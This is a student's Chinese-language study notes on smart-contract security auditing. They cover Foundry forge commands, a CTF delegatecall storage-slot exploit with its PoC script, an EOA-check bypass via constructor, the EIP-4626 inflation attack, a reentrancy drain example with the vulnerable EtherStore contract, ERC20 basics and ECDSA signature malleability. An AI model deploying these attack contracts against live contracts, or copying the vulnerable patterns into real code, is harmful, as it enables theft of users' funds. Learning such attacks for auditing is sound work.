---
timezone: UTC+8
---

# 刘星璇

**GitHub ID:** Ariko77

**Telegram:** @paekko

## Self-introduction

区块链工程专业在校学生，目前努力方向是区块链安全审计，还是小白

## Notes

<!-- Content_START -->
# 2025-08-11

forge：Solidity 构建与测试工具
常用命令
命令	说明
build	编译项目合约 [别名: compile]
clean	清除构建缓存和产物
create	部署合约
doc	生成合约文档
eip712	生成 EIP-712 编码结构
flatten	打平成一个合约文件
fmt	格式化 Solidity 代码
geiger	检测危险 cheatcode
init	初始化新项目
install	安装依赖
remove	移除依赖
==remappings	查看路径映射
script	运行合约脚本
selectors	函数选择器工具
snapshot	保存 gas 使用快照
soldeer	依赖管理工具
test	运行测试
tree	显示依赖关系树
update	更新依赖
verify-contract	在 Etherscan 验证合约
verify-bytecode	验证字节码与源码一致性
verify-check	检查验证状态
通用选项
选项	说明
-h, --help	显示帮助信息
-V, --version	显示版本
-j, --threads	设置线程数量
--json	JSON 输出
-q, --quiet	安静模式
-v, --verbosity	日志等级（可叠加）
更多内容：forge 官方文档
常见命令+实例
forge build — 编译项目合约
编译整个 Foundry 项目，生成字节码和 ABI，构建缓存等。
forge build
中文：编译项目中的 Solidity 合约，生成构建产物（在 out/ 和 cache/ 文件夹中）。

forge clean — 清除构建缓存
forge clean
中文：删除 out/ 和 cache/，清理构建产物，便于重新构建。

forge test — 运行测试
运行 test/ 目录中的测试合约。
forge test
运行指定测试文件或函数：
forge test --match-path test/Fallback.t.sol
forge test --match-test testFallbackAttack
中文：运行测试合约中所有以 test 开头的函数。

forge script — 运行合约脚本（可选广播）
forge script script/Deploy.s.sol:Deploy \
--rpc-url <RPC_URL> --private-key <私钥> --broadcast
中文：运行指定脚本（如部署、调用函数），并用私钥签名广播交易。

forge create — 快速部署合约
forge create src/MyContract.sol:MyContract \
--private-key <私钥> --rpc-url <RPC_URL>
中文：直接部署一个合约实例，不需写脚本。

forge install — 安装依赖包
forge install rari-capital/solmate
中文：从 GitHub 安装依赖，保存在 lib/ 目录中。

forge remove — 删除依赖包
forge remove rari-capital/solmate
中文：移除已安装的依赖。

forge flatten — 扁平化合约源码
forge flatten src/MyContract.sol > Flat.sol
中文：将多文件合约整合成一个文件，便于 Etherscan 验证。

forge doc — 生成项目文档
forge doc
中文：根据合约注释生成 Markdown 文档。

forge fmt — 格式化 Solidity 代码
forge fmt
forge fmt --check  # 只检查格式是否正确
中文：自动统一代码风格。

forge inspect — 检查合约结构
forge inspect MyContract abi
forge inspect MyContract storage
中文：查看合约的 ABI 或存储结构等。

forge snapshot — Gas 使用快照
forge snapshot
中文：记录每个测试函数的 gas 使用量，输出到 gas-snapshot 文件。

forge remappings — 查看路径映射
forge remappings
中文：查看 remappings.txt 中配置的库路径映射。

forge verify-contract — Etherscan 合约验证
forge verify-contract <合约地址> MyContract <etherscan-api-key> --chain-id 1
中文：将合约源码提交到 Etherscan 进行验证。

# 2025-08-09

# 题目分析
看一遍这个源码，首先是注意到这个delegatecall。然后我看到两个合约插槽的对齐，还有delegatecall的方式，先委托合约这个setnumber()函数，改变0槽和1槽，0槽是直接指定改变，1槽是一长串计算，暂且不管他。主合约的0槽存放的是委托合约的地址，让我想起之前做的delegatecall漏洞题，是把委托合约换成我们的攻击合约地址，而这里也正好符合，那么大概第一步思路就是先调用第一遍delegatecall，更新主合约0槽的委托合约地址为我们的攻击合约，然后构思一下我们的攻击合约，写一个同名的函数，这样再delegatecall就会执行我们写的这个同名函数的代码逻辑，这就是攻击要点。
issolved()要求的num==target，可以看到target可以在第一遍delegatecall的时候指定，因为两个合约的target槽是对齐的，然后我们再在我们写的攻击合约，把num的槽和主合约的num槽对齐就可以，然后在同名函数里赋值和target一样的值就可以了。
攻击步骤
1. 写一个攻击合约，槽位与主合约对齐，内里写个setnumber()函数，把槽3的num设为调用函数输入的参数
2. 先调用一次delegatecall，设target的值（这里是直接设置的主函数的target，不涉及delegatecall），把委托合约换成我们的攻击合约地址
3. 再次delegatecall，设num的值，和上边第一步target一样即可，这样就是进入的我们攻击合约那个同名函数的逻辑，给num赋值（这里是delegatecall，但因为槽位对齐，所以主函数也是num被赋值）
4. target和num数值相同，通过issolved
poc
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {BigNaiLong} from "./nailong.sol";

contract Attack {
    address public a; // 0
    uint256 public b; // 1，前两个槽不重要，只是为了对齐3槽凑数来的
    uint256 public number; // 2

    function setnumber(uint256 _num) public {
        number = _num;
    }
}
// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import {Attack} from "../src/Attack.sol";
import {BigNaiLong} from "../src/nailong.sol";
import {Script} from "forge-std/Script.sol";

contract Attacksc is Script {
    function run() external {
        vm.startBroadcast();
        Attack attack = new Attack();
        BigNaiLong bignailong = BigNaiLong(
            0x7B2c3C15DfEe33980ca8528e6BF7826eECf6eE27
        );
        bignailong.setnailong(7, uint256(uint160(address(attack))));//第一次delegatecall，把委托合约换成我们的攻击合约地址，赋值target==7
        bignailong.setnailong(7, 7);//第二次delegatecall，连接上的就是我们的攻击合约，把num也赋值成7，就能通过issolved的检查
        require(bignailong.isSolved(), "no");
        vm.stopBroadcast();
    }
}

# 2025-08-08

EOA检测绕过
绕过合约检查
很多 freemint 的项目为了限制科学家（程序员）会用到 isContract() 方法，希望将调用者 msg.sender 限制为外部账户（EOA），而非合约。这个函数利用 extcodesize 获取该地址所存储的 bytecode 长度（runtime），若大于0，则判断为合约，否则就是EOA（用户）。
这里有一个漏洞，就是在合约在被创建的时候，runtime bytecode 还没有被存储到地址上，因此 bytecode 长度为0。也就是说，如果我们将逻辑写在合约的构造函数 constructor 中的话，就可以绕过 isContract() 检查。
漏洞例子
下面我们来看一个例子：ContractCheck合约是一个 freemint ERC20 合约，铸造函数 mint() 中使用了 isContract() 函数来阻止合约地址的调用，防止科学家批量铸造。每次调用 mint() 可以铸造 100 枚代币。
我们写一个攻击合约，在 constructor 中多次调用 ContractCheck 合约中的 mint() 函数，批量铸造 1000 枚代币：
如果我们前面讲的是正确的，在构造函数调用mint()可以绕过isContract()的检查成功铸造代币，那么函数将成功配置，并且状态变量isContract会在构造函数赋值false。而在合约配置之后，runtime bytecode已经被存储在合约地址的话了，，extcodesize > 0能够isContract()成功阻止铸造，调用mint()函数将失败
测试步骤
部署 ContractCheck 合约。
部署 NotContract 合约，参数为 ContractCheck 合约地址。
调用 ContractCheck 合约的 balanceOf 查看 NotContract 合约的代币余额为 1000，攻击成功。
调用NotContract 合约的 mint() 函数，由于此时合约已经部署完成，调用 mint() 函数将失败。
预防办法
你可以使用 (tx.origin == msg.sender) 来检测调用者是否为合约。如果调用者为 EOA，那么tx.origin和msg.sender相等；如果它们俩不相等，调用者为合约。
Plain Text
复制代码
1
2
3
function realContract(address account) public view returns (bool) {
    return (tx.origin == msg.sender);
}
实现
部署目标合约，报了一次错从-vvv里拿到Attack地址，填到BalanceOf那里（邪如修）
脚本
Solidity
复制代码
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "../lib/forge-std/src/Script.sol";
import {Attack} from "../src/Attack.sol";
import {ContractCheck} from "../src/ContractCheck.sol";

contract CounterScript is Script {
    ContractCheck token =
        ContractCheck(0x95bD8D42f30351685e96C62EDdc0d0613bf9a87A);//注意写法，别让token成个空地址

    function run() public {
        vm.startBroadcast();
        new Attack(0x95bD8D42f30351685e96C62EDdc0d0613bf9a87A);
        require(
            token.balanceOf(0x98eDDadCfde04dC22a0e62119617e74a6Bc77313) == 1000,
            "no"
        );
        vm.stopBroadcast();
    }
}

# 2025-08-07

EIP4626
英文原词
Vault
金库 / Vault
shares
份额（share）
value
实际资产数量
baseUnit
精度单位（如 1e18）
exchangeRate
份额兑换率
holdings
金库当前总资产
methods
deposit 存钱,给股
将_value代币存入保险库并将其所有权授予_to。
_shares可以返回相应的按比例所有权值_value，如果不是，则必须返回0
redeem 给股,分钱
赎回指定数量的份额（_shares要赎回的份额数量），Vault 将根据当前兑换率把相应数量的原始资产（_value实际收到的资产数量）转给 _to
如果不能精确计算资产金额，也必须返回0表示无效  
withdraw 给钱,退股
_value从保险库中取出代币并将其转移到_to。
_shares可以返回对应于的按比例所有权值_value，如果不是，则必须返回0
_value: 想取出的资产数量,单位是LING/DAI等代币
_shares :  为了取出 _value 资产，你销毁的份额数量
totalHoldings
返回保险库持有/管理的底层代币总量
balanceOfUnderlying
返回保险库中持有的底层代币总量_owner
underlying
返回保险库用于记账、存款和取款的代币地址
totalSupply
 返回 Vault 中所有尚未赎回的总份额数量
balanceOf
 返回某个用户拥有的份额数量
exchangeRate 
获取当前每份 share 对应的资产数量（即兑换率), 也就是1 份 share 对应多少资产  
换算公式为：
资产数量 = shares × exchangeRate() ÷ baseUnit()
并且应满足：
exchangeRate() × 总份额（totalSupply） = Vault 总资产（totalHoldings
这是核心比率函数,通胀攻击就会影响这个数值
baseUnit
Solidity
复制代码
1
function baseUnit() public view returns(uint256)
返回 Vault 份额（shares）使用的单位基准值，通常是 10 ** decimals()。
用来统一换算中涉及的精度。例如：
Solidity
复制代码
1
assets = shares × exchangeRate / baseUnit
注意不是资产单位,而是用于兑换计算的单位比例
Events
Deposit 
当用户向 Vault 存入资产时触发该事件
event Deposit(address indexed _from, addres indexed _to, uint256 _value)
_from：触发存入操作、批准资产的地址
_to：获得份额的地址（可能与 _from 相同）
_vaule: 表示存入的资产数量
Withdraw
当用户从 Vault 中提取资产时触发该事件  
event Withdraw(address indexed _owner, addres indexed _to, uint256 _value)
_owner：份额的拥有者（用来换资产的）
_to：接收资产的一方（通常是用户自己）
_vaule: 表示赎回的资产数量
通货膨胀
简单来说就是攻击者先铸造极少份额,然后绕过share逻辑直接转入资产,让每个份额的价值暴涨,让后来的用户几乎买不到份额或者只能买到极少的份额,而攻击者能赎回整个vault的资产,白嫖别人钱

# 2025-08-06

# 重入漏洞
定义：如果外部调用的目标是一个攻击者可以控制的恶意的合约，那么当被攻击的合约在调用恶意合约的时候攻击者可以执行恶意的逻辑然后再重新进入到被攻击合约的内部，通过这样的方式来发起一笔非预期的外部调用，从而影响被攻击合约正常的执行逻辑
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.3;
contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
withdraw()函数中有一个外部调用(bool sent, ) = msg.sender.call{value: bal}("");

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        etherStore = EtherStore(_etherStoreAddress);
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
1. 部署EtherStore合约
2. A和B分别充值1以太,此时EtherStore合约有2个以太
3. 攻击者C调用Attack.attack函数,Attack.attack又调用EtherStore.deposit函数,充值一个以太到EtherStore合约中
4. Attack.attack又调用etherStore.withdraw函数将刚刚自己充值的一个以太拿走,此时EtherStore合约中就还剩两个以太(A、B充值的那俩)
5. 当Attack.attack调用etherStore.withdraw函数时会触发Attack.fallback函数,注意这个函数里的逻辑是,此时只要EtherStore合约中的以太大于等于1都会一直调用withdraw直到以太小于一,所以最后C拿走了剩下的两个以太币

# 2025-08-05

ERC20
IERC20是ERC20代币标准的接口合约，规定了ERC20代币需要实现的函数和事件
pragma solidity ^0.8.20;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}
6个函数
1. totalSupply()：查看此合约发行的ERC-20代币总量，
2. balanceOf() ：某个地址上的余额
3. transfer() ： 发送token，即转账

  ○ to不能是一个空地址
  ○ caller至少有value这么多余额
  ○ emit一个transfer事件
4. allowance() ：查看owner给spender授权的可转账额度
5. approve() ：owner给spender授权一定的转账额度（来自owner账户）

  ○ spender不能是一个空地址
  ○ emit一个approval事件
6. transferFrom()： spender用owner的代币进行转账，金额需要同时小于allowance和owner的余额
  ○ from和to都不可以是空地址
  ○ from的余额至少有value这么多
  ○ caller必须有来自from的至少value这么多的额度(allowance),就是from需要提前为msg.sender授权，即 from亲自去调用approve()函数
2个事件
触发事件需要emit，不是条件成立就直接触发
1. Transfer() ： 转账成功触发的事件触发条件：当 value 单位的货币从账户 (from) 转账到另一账户 (to)时
2. Approval() ：给某账户授权一定额度的事件触发条件：当 value 单位的货币从账户 (owner) 授权给另一账户 (spender)时
_mint() 和 _burn()
都是internal类型
● _mint() : 
_mint(address to, uint256 amount)
给地址 to 铸造（发放）amount 份额
● _burn():
_burn(address from, uint256 amount)
从地址 from 销毁 amount 份额

ERC20
ERC代表Ethereum Request for Comment。从本质上讲，它们是已获得社区批准的标准，用于传达某些用例的技术要求和规范。
ERC-20特别是一个标准，它概述了可替代代币的技术规范.
1. 6个函数
● totalSupply()： token的总量
● balanceOf() ：某个地址上的余额
● transfer() ： 发送token
● allowance() ：额度、配额、津贴
● approve() ： 批准给某个地址一定数量的token(授予额度、授予津贴)
● transferFrom()： 提取approve授予的token(提取额度、提取津贴)
标准函数	含义
totalSupply()	代币总量
balanceOf(addresss account)	account地址上的余额
transfer(address recipient, uint256 amount)	向recipient发送amount个代币
allowance(address owner, address spender)	查询owner给spender的额度(总配额)
approve(address spender, uint256 amount)	批准给spender的额度为amount(当前配额)
transferFrom(address sender, address recipient, uint256 amount)	recipient提取sender给自己的额度
2. 2个事件
● Transfer() ： token转移事件
● Approval() ：额度批准事件
事件	含义
Transfer(address indexed from, address indexed to, uint256 value)	代币转移事件：从from到to转移value个代币
Approval(address indexed owner, address indexed spender, uint256 value)	额度批准事件：owner给spender的额度为value
3. 实践(还没学完)
参考的网址https://learnblockchain.cn/article/4327(不知道靠不靠谱)
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";//这都是一行

    contract LW3Token is ERC20 {
    constructor(string memory _name, string memory _symbol) ERC20(_name, _symbol) {
    _mint(msg.sender, 10 * 10 ** 18);
    }
}

在构造函数中，我们需要来自用户的两个参数——_name它们_symbol指定我们加密货币的名称和符号。例如。名称 = 以太坊，符号 = ETH
在指定构造函数后，我们立即调用ERC20(_name, _symbol)
ERC20我们从 OpenZeppelin 导入的合约有它自己的构造函数，它需要name和symbol参数。由于我们正在扩展 ERC20 合约，因此我们需要在部署 ERC20 合约时初始化 ERC20 合约。
所以，作为我们构造函数的一部分，我们还需要调用ERC20合约上的构造函数。因此，我们为我们的合约提供_name和_symbol变量，我们立即将其传递给ERC20构造函数，从而初始化ERC20智能合约。`
_mint是标准合约中的一个internal函数ERC20,_mint接受两个参数 - 铸造地址和铸造代币数量
调用该_mint函数将一些代币铸造到msg.sender
10 * 10 ** 18:我希望将 10 个完整令牌铸造到我的地址

# 2025-08-04

今天忙着搬家 简单学了一点
以太坊交易使用的是 **ECDSA**（椭圆曲线数字签名算法）。一个签名由以下三部分组成：

+ `r`（32字节）
+ `s`（32字节）
+ `v`（1字节，用来标识哪个公钥对应这个签名）

# 签名冒充impersonation
在某些合约中，可能存在这样的验证逻辑：

```plain
address recovered = ecrecover(hash, v, r, s);
require(recovered == expectedSigner);
```

这段逻辑的意思是：**只要你能提供一个合法签名，它 recover 出来的地址是某个特定地址，那就放你过。**

# 签名可拓展性
ECDSA 签名是 **不唯一的！** 对于一个消息 `m` 和私钥 `sk`，你可以构造 **多个不同的签名**，它们都能成功通过验证。

主要原因在于：

对同一个 `(r, s)`，也可以构造 `(r, -s mod n)`，它也是合法的签名。

以太坊中，为了避免这种问题，现在规定：

+ `s` 必须在 `n / 2` 以下（`n` 是椭圆曲线的阶）
+ 否则签名就是非法的

但如果合约自己实现 `ecrecover` 验证，而**没有验证 **`**s**`** 是否小于 **`**n/2**`，那攻击者就可以“拓展”签名，**用另一个合法但不同的 **`**(r, s)**`** 对伪造签名**，从而伪装成原始签名者。


# 2025.07.30


<!-- Content_END -->
